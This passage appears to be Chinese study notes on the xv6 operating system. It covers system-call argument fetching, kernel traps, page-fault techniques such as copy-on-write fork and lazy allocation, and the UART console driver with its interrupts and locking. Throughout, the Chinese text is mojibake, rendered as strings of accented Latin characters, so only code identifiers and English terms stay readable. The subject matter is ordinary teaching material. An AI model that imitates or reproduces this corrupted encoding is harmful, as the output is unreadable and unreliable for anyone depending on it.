å‡½æ•°ä¼šå°†è¯¥å€¼è¿”å› ç³»ç»Ÿè°ƒç”¨å·æ— æ•ˆï¼Œä¼šæ‰“å°é”™è¯¯ç„¶åè¿”å› -1 ä»£ç ï¼šç³»ç»Ÿè°ƒç”¨å‚æ•°æ ¹æ® RISC-V C è°ƒç”¨çº¦å®šï¼Œç³»ç»Ÿè°ƒç”¨å‚æ•°å­˜æ”¾åœ¨å¯„å­˜å™¨ä¸­ å†…æ ¸é™·é˜±ä»£ç å°†å¯„å­˜å™¨çš„å€¼ä¿å­˜åˆ°å½“å‰è¿›ç¨‹çš„ trapframe ä¸­ï¼Œè¿™æ ·å†…æ ¸å¯ä»¥æ‰¾åˆ°å®ƒä»¬ å†…æ ¸å‡½æ•° argintï¼Œargaddrï¼Œargfd ä» trapframe ä¸­æ£€ç´¢ç³»ç»Ÿè°ƒç”¨å‚æ•°ä½œä¸ºæ•´æ•°ã€æŒ‡é’ˆæˆ–æ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒä»¬éƒ½è°ƒç”¨ argraw ä»ç”¨æˆ·å¯„å­˜å™¨ä¸­æ£€ç´¢ æŒ‡é’ˆä½œä¸ºå‚æ•°æœ‰ä¸¤ä¸ªæŒ‘æˆ˜ ç”¨æˆ·ç¨‹åºå¯èƒ½æ˜¯é”™è¯¯æˆ–æ¶æ„çš„ï¼Œä¼ é€’ä¸€ä¸ªæ— æ•ˆçš„æŒ‡é’ˆæˆ–æ¬ºéª—å†…æ ¸ç”¨æ¥è®¿é—®å†…æ ¸å†…å­˜çš„æŒ‡é’ˆ xv6 å†…æ ¸é¡µè¡¨æ˜ å°„ä¸ç”¨æˆ·é¡µè¡¨æ˜ å°„å¹¶ä¸ç›¸åŒï¼Œä¸èƒ½ç”¨æ™®é€šæŒ‡ä»¤ä»æä¾›çš„åœ°å€åŠ è½½æˆ–å­˜å‚¨æ•°æ® å†…æ ¸å®ç°äº†å®‰å…¨çš„ä¼ è¾“æ•°æ®çš„å‡½æ•° æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨å¦‚ exec ç”¨ fetchstrï¼ˆkernel/syscall.cï¼‰ä»ç”¨æˆ·ç©ºé—´æ£€ç´¢å­—ç¬¦ä¸²æ–‡ä»¶åå‚æ•° fetchstr è°ƒç”¨ copyinstrï¼ˆkernel/vm.cï¼‰æ¥å®Œæˆ copyinstr ä»ç”¨æˆ·é¡µè¡¨çš„è™šæ‹Ÿåœ°å€ p-&gt;pagetable-&gt;srcva å¤åˆ¶ max å­—èŠ‚åˆ° dst ä¸­ å› ä¸º pagetable ä¸æ˜¯å½“å‰çš„é¡µè¡¨ï¼Œcopyinstr ä½¿ç”¨ walkaddrï¼ˆå®ƒä¼šè°ƒç”¨ walkï¼‰ åœ¨ pagetable ä¸­æŸ¥æ‰¾ srcvaï¼Œä»è€Œäº§ç”Ÿç‰©ç†åœ°å€ pa0 å†…æ ¸å°†æ¯ä¸ªç‰©ç†å†…å­˜åœ°å€æ˜ å°„åˆ°å¯¹åº”çš„å†…æ ¸è™šæ‹Ÿåœ°å€ï¼Œå› æ­¤ copyinstr èƒ½ç›´æ¥ä» pa0 å¤åˆ¶å­—ç¬¦ä¸²å­—èŠ‚åˆ° dst walkaddrï¼ˆkernel/vm.cï¼‰ä¼šæ£€æŸ¥ç”¨æˆ·æä¾›çš„è™šæ‹Ÿåœ°å€æ˜¯å¦æ˜¯è¿›ç¨‹åœ°å€ç©ºé—´çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤ç¨‹åºä¸èƒ½æ¬ºéª—å†…æ ¸æ¥è¯»å–å…¶ä»–å†…å­˜ ç±»ä¼¼çš„åŠŸèƒ½ copyout ä»å†…æ ¸è¯»å–æ•°æ®åˆ°ç”¨æˆ·æä¾›çš„åœ°å€ å†…æ ¸ trapCPU åœ¨æ‰§è¡Œå†…æ ¸æ—¶ï¼Œstvec ä¼šæŒ‡å‘ kernelvecï¼ˆkernel/kernelvec.Sï¼‰ å¦‚æœå‘ç”Ÿ trap ä¼šè·³è½¬åˆ° kernelvec æ¥å¤„ç† trap kernelvec å°†é€šç”¨å¯„å­˜å™¨ä¿å­˜åœ¨ä¸­æ–­çš„å†…æ ¸çº¿ç¨‹çš„æ ˆä¸­ï¼Œtrap æœ‰å¯èƒ½å¯¼è‡´åˆ‡æ¢çº¿ç¨‹ï¼Œè¿™æ ·ä¸ä¼šå¯¼è‡´æ··ä¹± kernelvec ä¿å­˜å®Œå¯„å­˜å™¨åè°ƒç”¨ kerneltrapï¼ˆkernel/trap.cï¼‰ kerneltrap ä¼šä¿å­˜æ§åˆ¶å¯„å­˜å™¨å¹¶å¤„ç†ä¸¤ç§ trap è®¾å¤‡ä¸­æ–­ ä½¿ç”¨ devintr æ£€æŸ¥è®¾å¤‡ä¸­æ–­ å¦‚æœæ˜¯è®¡æ—¶å™¨ä¸­æ–­ï¼Œä¸”è¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹æ­£åœ¨è¿è¡Œï¼Œkerneltrep ä¼šè°ƒç”¨ yield è®©å…¶ä»–çº¿ç¨‹æœ‰æœºä¼šè¿è¡Œ å¼‚å¸¸ å†…æ ¸ä¼šè°ƒç”¨ panic ç„¶ååœæ­¢è¿è¡Œ å½“ kerneltrap ä»»åŠ¡å®Œæˆåï¼Œå®ƒéœ€è¦è¿”å›åˆ° trap ä¸­æ–­çš„ä»£ç ï¼Œä¼šæ¢å¤ä¿å­˜çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œç„¶åè¿”å›åˆ° kernelvec kernelvec æ¢å¤ä¿å­˜çš„é€šç”¨å¯„å­˜å™¨ï¼Œç„¶åæ‰§è¡Œ sretï¼Œè¿”å›ä¸­æ–­çš„å†…æ ¸ä»£ç  åœ¨å†…æ ¸å¼€å§‹æ‰§è¡Œæ—¶æœ‰ä¸€æ®µæ—¶é—´ stvec ä»ç„¶æŒ‡å‘ uservecï¼Œè¿™æ®µæ—¶é—´å†…ä¸å…è®¸å‘ç”Ÿè®¾å¤‡ä¸­æ–­ RISC-V ä¼šåœ¨å‘ç”Ÿ trap æ—¶å…³é—­è®¾å¤‡ä¸­æ–­ï¼Œè®©å†…æ ¸æœ‰æ—¶é—´è®¾ç½® stvec ä¸º kernelvec é¡µé¢é”™è¯¯å¼‚å¸¸CPU ä¼šå‘å‡ºé¡µé¢é”™è¯¯å¼‚å¸¸ï¼Œå½“ï¼š è™šæ‹Ÿåœ°å€åœ¨é¡µè¡¨ä¸­æ²¡æœ‰æ˜ å°„ PTE çš„ PTE_V æ ‡å¿—ä½ä¸º 0 PTE çš„æƒé™ä½é˜»æ­¢æ­£åœ¨å°è¯•çš„æ“ä½œ RISC-V åŒºåˆ†ä¸‰ç§é¡µé¢é”™è¯¯ï¼š load page faults store page faults instruction page faults PC å¯„å­˜å™¨çš„åœ°å€æŒ‡å‘çš„æŒ‡ä»¤æ— æ³•ç¿»è¯‘ xv6 çš„å¼‚å¸¸å¤„ç†å¾ˆå•ä¸€ï¼šå¦‚æœåœ¨ç”¨æˆ·ç©ºé—´å‘ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸ä¼šæ€æ­»å‡ºé”™çš„è¿›ç¨‹ï¼Œå¦‚æœåœ¨å†…æ ¸ä¸­å‘ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸ä¼šå‘ç”Ÿ panic çœŸå®çš„æ“ä½œç³»ç»Ÿä¼šåšå¾ˆå¤šæœ‰è¶£çš„å¤„ç† COW fork Lazy allocation Demand Paging Paging to disk Extending stacks Memory-mapped files COW forkè®¸å¤šå†…æ ¸ä½¿ç”¨é¡µé¢é”™è¯¯æ¥å®ç° COWï¼ŒåŠ å¿« forkï¼Œå®ƒä¸éœ€è¦å¤åˆ¶å†…å­˜ï¼Œç‰¹åˆ«æ˜¯åœ¨ fork å exec æ—¶å¾ˆé«˜æ•ˆ åœ¨ xv6 ä¸­ï¼Œfork ä¼šè®©å­è¿›ç¨‹çš„åˆå§‹å†…å­˜ä¸çˆ¶è¿›ç¨‹çš„ç›¸åŒï¼Œå®ƒè°ƒç”¨ uvmcopy ç»™å­è¿›ç¨‹åˆ†é…ç‰©ç†ç©ºé—´å¹¶å¤åˆ¶çˆ¶è¿›ç¨‹çš„å†…å­˜ç»™å®ƒ å¦‚æœçˆ¶å­è¿›ç¨‹å…±äº«çˆ¶è¿›ç¨‹çš„ç‰©ç†å†…å­˜ä¼šæ›´åŠ é«˜æ•ˆ COW fork çš„ç®€å•è®¡åˆ’ çˆ¶å­è¿›ç¨‹ä¸€å¼€å§‹å…±äº«æ‰€æœ‰çš„ç‰©ç†é¡µï¼Œä¸”è®¾ä¸ºåªè¯» å½“æŸä¸ªè¿›ç¨‹è¦å†™å…¥å†…å­˜æ—¶ï¼ŒCPU æŠ›å‡ºé¡µé¢é”™è¯¯å¼‚å¸¸ å†…æ ¸çš„ trap å¤„ç†ç¨‹åºåˆ†é…ä¸€ä¸ªæ–°çš„ç‰©ç†é¡µé¢ï¼Œå¹¶å°†åŸé¡µé¢çš„å†…å®¹å¤åˆ¶è¿‡å» å°†å‡ºé”™è¿›ç¨‹çš„é¡µè¡¨ä¸­ç›¸å…³ PTE æŒ‡å‘å‰¯æœ¬ï¼Œå…è®¸è¯»å†™ï¼Œç„¶åé‡æ–°æ‰§è¡ŒæŒ‡ä»¤ COW éœ€è¦ä¸€ä¸ªè®°å½•ï¼Œæ¥å†³å®šç‰©ç†é¡µé¢ä½•æ—¶é‡Šæ”¾ï¼Œå®ƒå¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨ï¼›å½“å‘ç”Ÿ store é¡µé¢é”™è¯¯æ—¶ï¼Œå¦‚æœè¯¥ç‰©ç†é¡µé¢åªæœ‰å‡ºé”™è¿›ç¨‹æŒ‡å‘å®ƒï¼Œä¸éœ€è¦å†å¤åˆ¶ï¼Œç›´æ¥ä½¿ç”¨ Lazy allocationç”¨æˆ·ç¨‹åºè°ƒç”¨ sbrk ç”³è¯·æ›´å¤šå†…å­˜æ—¶ï¼Œå†…æ ¸å…ˆå¢åŠ å®ƒçš„ sizeï¼Œä½†ä¸ç”³è¯·ç‰©ç†å†…å­˜ï¼Œä¸åˆ›å»ºæ˜ å°„ å½“ç”¨æˆ·ç¨‹åºè®¿é—®æ–°åœ°å€æ—¶ï¼Œä¼šå‘ç”Ÿé¡µé¢é”™è¯¯ï¼Œå†…æ ¸å†ç”³è¯·ä¸€é¡µç‰©ç†å†…å­˜å¹¶åœ¨é¡µè¡¨æ·»åŠ æ˜ å°„ kalloc åˆå§‹åŒ–é¡µé¢ é¡µé¢æ˜ å°„ æ›´æ–°é¡µè¡¨ é‡æ–°æ‰§è¡ŒæŒ‡ä»¤ å¦‚æœç”¨æˆ·ç¨‹åºç”³è¯·äº†å¾ˆå¤§å†…å­˜ï¼Œä½†æ˜¯ä¸å»ä½¿ç”¨ï¼ŒLazy allocation ä¼šæé«˜æ•ˆç‡ lazy allocation å¯ä»¥è®©ç©ºé—´æˆæœ¬éšæ—¶é—´åˆ†æ‘Šï¼Œä½†æ˜¯ä¼šå¯¼è‡´é¡µé¢é”™è¯¯çš„é¢å¤–å¼€é”€ å†…æ ¸å¯ä»¥é€šè¿‡åˆ†é…ä¸€æ‰¹è¿ç»­é¡µé¢ï¼Œå¯¹é¡µé¢é”™è¯¯çš„ trap å¤„ç†ç¨‹åºè¿›è¡Œç‰¹æ®ŠåŒ–æ¥å‡å°å¼€é”€ Demand pagingåœ¨ exec ä¸­ï¼Œxv6 ä¼šå°†ç¨‹åºçš„æ‰€æœ‰ text å’Œ data ç›´æ¥åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç”±äºç¨‹åºå¯èƒ½ä¼šå¾ˆå¤§ï¼Œä»ç£ç›˜ä¸­è¯»å–å¼€é”€æ˜‚è´µ ç°ä»£å†…æ ¸ä¸ºç”¨æˆ·åœ°å€ç©ºé—´åˆ›å»ºé¡µè¡¨ï¼Œä½†æ˜¯ PTE æ ‡è®°ä¸ºæ— æ•ˆ å½“å‡ºç°é¡µé¢é”™è¯¯æ—¶ï¼Œå†…æ ¸å°†é¡µé¢çš„å†…å®¹ä»ç£ç›˜ä¸­è¯»å–ï¼Œæ·»åŠ æ˜ å°„ Paging to diskä¸€ä¸ªè¿›ç¨‹å¯èƒ½éœ€è¦çš„å†…å­˜å¤šäºè®¡ç®—æœºçš„ RAMï¼Œæ“ä½œç³»ç»Ÿå¯èƒ½ä¼šå®ç° paging to disk å†…æ ¸ä¼šå°†ç”¨æˆ·é¡µé¢çš„ä¸€éƒ¨åˆ†æ”¾åœ¨å†…å­˜ä¸­ï¼Œå…¶ä½™çš„é¡µé¢ä¿å­˜åˆ°ç£ç›˜ä¸­çš„ paging area åŒºåŸŸï¼Œå¹¶å°†å¯¹åº”çš„ PTE æ ‡è®°ä¸ºæ— æ•ˆ å½“è¿›ç¨‹å°è¯•è®¿é—®ç£ç›˜ä¸Šçš„é¡µé¢ï¼Œä¼šå‘ç”Ÿé¡µé¢é”™è¯¯ï¼Œå†…æ ¸ä¼šå°†è¯¥é¡µé¢ä»ç¡¬ç›˜ä¸­è¯»å–å‡ºæ¥ å¦‚æœæ²¡æœ‰å¤šä½™çš„å†…å­˜ å†…æ ¸å…ˆå°†ä¸€ä¸ªé¡µé¢é©±é€ï¼Œä¿å­˜åˆ°ç£ç›˜ä¸­ï¼Œå°†å¯¹åº”çš„ PTE æ ‡è®°ä¸ºæ— æ•ˆï¼Œä½†æ˜¯é©±é€çš„èŠ±é”€æ˜¯æ˜‚è´µçš„ çœŸå®ä¸–ç•Œå¦‚æœå°†å†…æ ¸å†…å­˜æ˜ å°„åˆ°æ¯ä¸ªè¿›ç¨‹çš„ç”¨æˆ·é¡µè¡¨ä¸­ï¼Œå¯ä»¥æ¶ˆé™¤å¯¹é¡µè¡¨åˆ‡æ¢çš„éœ€æ±‚ ç”Ÿäº§ç¯å¢ƒçš„æ“ä½œç³»ç»Ÿå®ç°äº† COWã€Lazy allocationã€Demand pagingã€Paging to diskã€Memory-mapped files ç­‰ç­‰ xv6 æ²¡æœ‰è¿™æ ·åšï¼Œå¦‚æœç”¨å®Œå†…å­˜ï¼Œ Chapter 5 Interrupts and device drivers é©±åŠ¨ç¨‹åºï¼ˆdriverï¼‰ æ“ä½œç³»ç»Ÿä¸­ç®¡ç†ç‰¹å®šè®¾å¤‡çš„ä»£ç å®ƒé…ç½®ç¡¬ä»¶ï¼Œå‘Šè¯‰è®¾å¤‡æ‰§è¡Œæ“ä½œï¼Œå¤„ç†äº§ç”Ÿçš„ä¸­æ–­ï¼Œä¸å¯èƒ½æ­£åœ¨ç­‰å¾…æ¥è‡ªè®¾å¤‡ I/O çš„è¿›ç¨‹è¿›è¡Œäº¤äº’ driver ä»£ç å¯èƒ½å¾ˆå¤æ‚ï¼Œå› ä¸ºé©±åŠ¨ç¨‹åºä¸å®ƒç®¡ç†çš„è®¾å¤‡è¦åŒæ—¶æ‰§è¡Œ driver å¿…é¡»äº†è§£è®¾å¤‡çš„ç¡¬ä»¶æ¥å£ï¼Œæ¥å£å¯èƒ½å¾ˆå¤æ‚ä¸”ç¼ºä¹æ–‡æ¡£è®°å½• åç»­é©±åŠ¨ç¨‹åºç”¨ driver è¡¨ç¤ºï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯ driver åœ¨ä¸€å †ä¸­æ–‡é‡Œæ›´æ¸…æ™°ï¼‰ ä¸­æ–­ï¼ˆInterruptï¼‰ è®¾å¤‡éœ€è¦æ“ä½œç³»ç»Ÿç‰¹åˆ«å…³æ³¨ï¼Œå®ƒå¯ä»¥è¿›è¡Œé…ç½®ï¼Œäº§ç”Ÿä¸­æ–­ï¼ˆtrap çš„ä¸€ç§ï¼‰ å½“è®¾å¤‡å‘èµ·ä¸­æ–­ï¼Œå†…æ ¸ trap å¤„ç†ä»£ç èƒ½è¯†åˆ«å‡ºè®¾å¤‡ä¸­æ–­å¹¶è°ƒç”¨é©±åŠ¨ç¨‹åºçš„ä¸­æ–­å¤„ç†ç¨‹åº åœ¨ xv6 ä¸­ï¼Œä¸­æ–­å¤„ç†çš„åˆ†é…åœ¨ devintr å‡½æ•°ä¸­ è®¸å¤šè®¾å¤‡ driver åœ¨ä¸¤ä¸ªä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç  åœ¨è¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹ä¸­æ‰§è¡Œå‰åŠéƒ¨åˆ† å‰åŠéƒ¨åˆ†ç”±éœ€è¦æ‰§è¡Œ I/O çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚ read å’Œ writeï¼‰æ¥è°ƒç”¨ æ­¤ä»£ç å¯èƒ½è¯·æ±‚ç¡¬ä»¶å¯åŠ¨æ“ä½œï¼ˆå¦‚è¯·æ±‚ç¡¬ç›˜è¯»å–å—ï¼‰ï¼Œç„¶åç­‰å¾…æ“ä½œå®Œæˆ æœ€åè®¾å¤‡å®Œæˆæ“ä½œï¼Œå‘èµ·ä¸­æ–­ åœ¨ä¸­æ–­æ—¶æ‰§è¡ŒååŠéƒ¨åˆ† driver çš„ä¸­æ–­å¤„ç†ç¨‹åºä½œä¸ºååŠéƒ¨åˆ† å®ƒæ‰¾åˆ°è®¾å¤‡å®Œæˆçš„æ“ä½œï¼Œåœ¨é€‚å½“çš„æƒ…å†µå”¤é†’æ­£åœ¨ç­‰å¾…çš„è¿›ç¨‹ å‘Šè¯‰ç¡¬ä»¶å¼€å§‹å¤„ç†ä¸‹ä¸€ä¸ªæ“ä½œ ä»£ç ï¼šæ§åˆ¶å°è¾“å…¥æ§åˆ¶å°è¿æ¥åˆ° RISC-Væ§åˆ¶å° driver ä½äº kernel/console.cï¼Œå¯ä½œä¸ºé©±åŠ¨ç¨‹åºç»“æ„çš„ä¸€ä¸ªç®€å•è¯´æ˜ xv6 çš„æ§åˆ¶å° driver äº¤äº’çš„ UART ç¡¬ä»¶æ˜¯ QEMU ä»¿çœŸçš„ 16550 èŠ¯ç‰‡ï¼Œåœ¨çœŸå®çš„è®¡ç®—æœºï¼Œä¸€ä¸ª 16550 èŠ¯ç‰‡ç®¡ç† RS232 ä¸²è¡Œé“¾è·¯ï¼Œè¿æ¥ç€ä¸€ä¸ªä¸­æ–­æˆ–å…¶ä»–è®¡ç®—æœºã€‚å½“è¿è¡Œ QEMU æ—¶ï¼Œå®ƒè¿æ¥ç€é”®ç›˜å’Œæ˜¾ç¤ºå™¨ æ§åˆ¶å° driver ä¸€æ¬¡ç´¯ç§¯ä¸€è¡Œçš„è¾“å…¥ï¼Œå¤„ç†ç‰¹æ®Šçš„è¾“å…¥å­—ç¬¦ï¼Œå¦‚é€€æ ¼ backspace å’Œ control-u å½“ç”¨æˆ·åœ¨ QEMU ä¸­å‘ xv6 è¾“å…¥æ—¶ï¼Œå‡»é”®é€šè¿‡ QEMU æ¨¡æ‹Ÿçš„ UART ç¡¬ä»¶ä¼ é€’ç»™ xv6 ä¸€äº›ç‰©ç†åœ°å€ç”± RISC-V ç¡¬ä»¶è¿æ¥åˆ° UART è®¾å¤‡ ä»è¿™äº›ç‰©ç†åœ°å€è¯»å†™æ˜¯ä¸è®¾å¤‡ç¡¬ä»¶äº¤äº’è€Œä¸æ˜¯å†…å­˜ UART çš„å†…å­˜æ˜ å°„åœ°å€ä» 0x10000000 ï¼ˆæˆ– UART0 kenrel/memlayout.hï¼‰å¼€å§‹ æ§åˆ¶å¯„å­˜å™¨UART ç¡¬ä»¶åœ¨è½¯ä»¶å±‚é¢ä¸ºä¸€ç»„å†…å­˜æ˜ å°„çš„æ§åˆ¶å¯„å­˜å™¨ï¼ˆè¿™é‡Œçš„å¯„å­˜å™¨å¹¶ä¸æ˜¯ CPU å¯„å­˜å™¨ï¼Œè€Œä¸”ä½äº UART ç¡¬ä»¶ä¸­çš„å¯„å­˜å™¨ï¼‰ UART æ§åˆ¶å¯„å­˜å™¨å®½åº¦ä¸º 1 Byteï¼Œå®ƒä»¬åœ¨ UART0 çš„åç§»åœ¨ kernel/uart.c ä¸­å®šä¹‰ LSR line status register æ¯”ç‰¹ä½è¡¨ç¤ºè¾“å…¥çš„å­—ç¬¦æ˜¯å¦åœ¨ç­‰å¾…è½¯ä»¶è¯»å– RHR receive holding register ä¿å­˜ç­‰å¾…è¯»å–çš„å­—ç¬¦ æ¯æ¬¡ä¸€ä¸ªå­—ç¬¦è¢«è¯»å–ï¼ŒUART ç¡¬ä»¶å°†å®ƒä»ä¸€ä¸ª FIFO çš„ç»“æ„ä¸­åˆ é™¤ å½“ FIFO ç»“æ„ä¸ºç©ºæ—¶å°† LSR çš„ ready ä½æ¸…é›¶ THR transimit holding register ä¿å­˜ç­‰å¾…ä¼ è¾“çš„å­—ç¬¦ UART ä¼ è¾“ç¡¬ä»¶å¾ˆå¤§ç¨‹åº¦ä¸Šç‹¬ç«‹äºæ¥æ”¶ç¡¬ä»¶ï¼Œå¦‚æœè½¯ä»¶å‘ THR å†™ 1 Byteï¼ŒUART å°±ä¼ è¾“è¯¥å­—èŠ‚ xv6 çš„æ§åˆ¶å°è¾“å…¥xv6 çš„ main è°ƒç”¨ consoleinit æ¥åˆå§‹åŒ– UART ç¡¬ä»¶ï¼Œé…ç½® UART è®©å®ƒæ¯æ¥æ”¶åˆ° 1 Byte è¾“å…¥å°±ç”Ÿæˆä¸€ä¸ª receive ä¸­æ–­ï¼Œæ¯å®Œæˆ 1 Byte çš„è¾“å‡ºå°±ç”Ÿæˆä¸€ä¸ª transmit complete ä¸­æ–­ ç”¨æˆ·è¿›ç¨‹ï¼Œå¦‚ shellï¼Œé€šè¿‡ user/init.c æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä½¿ç”¨ read ç³»ç»Ÿè°ƒç”¨ä»æ§åˆ¶å°è·å–è¾“å…¥è¡Œ read ç³»ç»Ÿè°ƒç”¨é€šè¿‡å†…æ ¸çš„ consoleread å®Œæˆæ“ä½œ consoleread ç­‰å¾…è¾“å…¥ï¼ˆé€šè¿‡ä¸­æ–­ï¼‰ï¼Œç„¶åå°†å­—ç¬¦æ”¾å…¥ cons.buf ä½œä¸ºç¼“å†²ï¼ŒæŠŠè¾“å…¥å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œç›´åˆ°ä¸€æ•´è¡Œè¾“å…¥åˆ°è¾¾ï¼Œè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹ å¦‚æœç”¨æˆ·è¿˜æ²¡æœ‰è¾“å…¥ä¸€æ•´è¡Œï¼Œä»»ä½•éœ€è¦è¯»å–çš„è¿›ç¨‹éƒ½åœ¨ sleep è°ƒç”¨ä¸­ç­‰å¾… å½“ç”¨æˆ·è¾“å…¥ä¸€ä¸ªå­—ç¬¦ UART ç¡¬ä»¶è¯·æ±‚ RISC-V å‘èµ·ä¸­æ–­ï¼Œæ¿€æ´» xv6 çš„ trap å¤„ç†ç¨‹åº trap å¤„ç†ç¨‹åºä¼šè°ƒç”¨ devintrï¼Œä» scause å¯„å­˜å™¨æŸ¥æ‰¾ä¸­æ–­æ¥è‡ªå“ªä¸ªå¤–éƒ¨è®¾å¤‡ï¼Œç„¶åå‘Šè¯‰ PLIC ç¡¬ä»¶å•å…ƒå“ªä¸ªè®¾å¤‡å‘å‡ºä¸­æ–­ï¼Œå¦‚æœæ¥è‡ª UARTï¼Œdevintr ä¼šè°ƒç”¨ uartintr uartintr è¯»å–æ¥è‡ª UART ç¡¬ä»¶çš„ç­‰å¾…è¾“å…¥çš„å­—ç¬¦ï¼ˆRHRï¼‰ï¼Œå°†å®ƒä»¬ä¼ ç»™ consoleintr consoleintr ä¼šå°†å­—ç¬¦ç§¯ç´¯åœ¨ cons.bufï¼Œä½†å¯¹ backspace å’Œä¸€äº›å…¶ä»–å­—ç¬¦ç‰¹æ®Šå¤„ç† å½“ä¸€è¡Œæ–°çš„å­—ç¬¦åˆ°è¾¾ï¼ˆè¯»å–åˆ° â€˜\\nâ€™ï¼‰æ—¶ï¼Œconsoleintr ä¼šå”¤é†’ä¸€ä¸ªæ­£åœ¨ç­‰ç€ç­‰å¾…çš„ consoleread ä»£ç ï¼šæ§åˆ¶å°è¾“å‡ºè®¾å¤‡ driver ç»´æŠ¤ä¸€ä¸ªè¾“å…¥ç¼“å†²åŒº uart_tx_bufï¼Œå› æ­¤éœ€è¦è¾“å‡ºçš„è¿›ç¨‹ä¸éœ€è¦ç­‰å¾… UART å®Œæˆå‘é€ï¼Œé™¤éç¼“å†²åŒºå·²æ»¡ write ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨è¿æ¥ç€æ§åˆ¶å°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæœ€ç»ˆä¼šåˆ°è¾¾ uartputc uartputc å°†æ¯ä¸ªå­—ç¬¦åŠ å…¥ç¼“å†²åŒºï¼Œè°ƒç”¨ uartstart å¼€å§‹è®¾å¤‡ä¼ è¾“å¹¶è¿”å› UART æ¯å®Œæˆä¸€ä¸ªå­—èŠ‚çš„å‘é€ï¼Œå°±ä¼šå‘èµ·ä¸­æ–­ï¼Œuartintr è°ƒç”¨ uartstart æ£€æŸ¥è®¾å¤‡æ˜¯å¦å·²ç»å®Œæˆå‘é€ï¼Œç„¶åå°†ä¸‹ä¸€ä¸ªç¼“å†²çš„è¾“å‡ºå­—ç¬¦ä¼ ç»™è®¾å¤‡ å¦‚æœä¸€ä¸ªè¿›ç¨‹å°†å¤šä¸ªå­—èŠ‚å†™å…¥æ§åˆ¶å°ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¼šç”± uartputc è°ƒç”¨çš„ uartstart æ¥å‘é€ï¼Œå‰©ä¸‹çš„å­—èŠ‚ç”± uartintr è°ƒç”¨çš„ uartstart æ¥å‘é€ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œé€šè¿‡ç¼“å†²å’Œä¸­æ–­å°†è®¾å¤‡æ´»åŠ¨å’Œè¿›ç¨‹æ´»åŠ¨è¿›è¡Œè§£è€¦ æ§åˆ¶å° driver å¯ä»¥å¤„ç†è¾“å…¥ï¼Œå³ä½¿æ²¡æœ‰è¿›ç¨‹ç­‰å¾…è¯»å–ï¼Œä¸€ä¸ªåæ¥çš„è¯»å–å¯ä»¥çœ‹åˆ°è¾“å…¥ï¼›è¿›ç¨‹å¯ä»¥ä¸ç­‰å¾…è®¾å¤‡å‘é€è¾“å‡º è§£è€¦é€šè¿‡å…è®¸è¿›ç¨‹ä¸è®¾å¤‡ I/O åŒæ—¶æ‰§è¡Œæ¥æé«˜æ€§èƒ½ï¼Œå½“è®¾å¤‡é€Ÿåº¦æ…¢ï¼ˆå¦‚ UARTï¼‰æˆ–éœ€è¦å³æ—¶å“åº”ï¼ˆå¦‚å›åº”é”®å…¥çš„å­—ç¬¦ï¼‰æ—¶å°¤å…¶é‡è¦ è¿™ä¹Ÿè¢«ç§°ä¸º I/O å¹¶è¡Œ é©±åŠ¨ç¨‹åºä¸­çš„å¹¶å‘ä½ å¯èƒ½æ³¨æ„åˆ°åœ¨ consoleread å’Œ consoleintr ä¸­è°ƒç”¨ acquire è¿™ä¸ªè°ƒç”¨ç”³è¯·ä¸€ä¸ªğŸ”’ï¼Œä¿æŠ¤æ§åˆ¶å° driver çš„æ•°æ®ç»“æ„å…å—å¹¶å‘è®¿é—®å½±å“ ä¸‰ä¸ªå¹¶å‘å±é™©ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç«äº‰æˆ–æ­»é” ä¸¤ä¸ªåœ¨ä¸åŒ CPU æ ¸çš„è¿›ç¨‹åŒæ—¶è°ƒç”¨ consoleread å½“ CPU æ­£åœ¨æ‰§è¡Œ consoleread æ—¶ï¼Œç¡¬ä»¶å¯èƒ½è¯·æ±‚è¯¥ CPU å‘é€æ§åˆ¶å°ä¸­æ–­ å½“ CPU æ­£åœ¨æ‰§è¡Œ consoleread æ—¶ï¼Œç¡¬ä»¶å¯èƒ½åœ¨å¦ä¸€ä¸ª CPU ä¸­å‘é€æ§åˆ¶å°ä¸­æ–­ drivers çš„å¹¶å‘å¦ä¸€ä¸ªéœ€è¦å°å¿ƒçš„åœ°æ–¹ï¼šä¸€ä¸ªè¿›ç¨‹å¯èƒ½ç­‰å¾…è®¾å¤‡è¾“å…¥ï¼Œå½“å¦ä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œæ—¶ï¼Œè¾“å…¥çš„ä¸­æ–­ä¿¡å·å¯èƒ½åˆ°è¾¾ ä¸­æ–­å¤„ç†ç¨‹åºä¸ä¼šè€ƒè™‘ä¸­æ–­çš„è¿›ç¨‹å’Œä»£ç ï¼Œä¾‹å¦‚ä¸€ä¸ªä¸­æ–­å¤„ç†ç¨‹åºæ— æ³•å®‰å…¨åœ°ä½¿ç”¨å½“å‰è¿›ç¨‹çš„é¡µè¡¨è°ƒç”¨ copyoutï¼Œå®ƒåªä¼šåšå¾ˆå°‘é‡çš„å·¥ä½œï¼ˆå¦‚ï¼Œå°†è¾“å…¥æ•°æ®å¤åˆ¶åˆ°ç¼“å†²åŒºï¼‰ï¼Œå¹¶å”¤é†’å‰åŠéƒ¨åˆ†ä»£ç å®Œæˆå…¶ä½™å·¥ä½œ å®šæ—¶å™¨ä¸­æ–­Xv6 ä½¿ç”¨å®šæ—¶å™¨ä¸­æ–­ç»´æŒæ—¶é’Ÿï¼Œä½¿å…¶èƒ½åœ¨è¿›ç¨‹ä¹‹é—´åˆ‡æ¢è¿›è¡Œè°ƒåº¦ usertrap å’Œ kerneltrap ä¸­çš„ yield 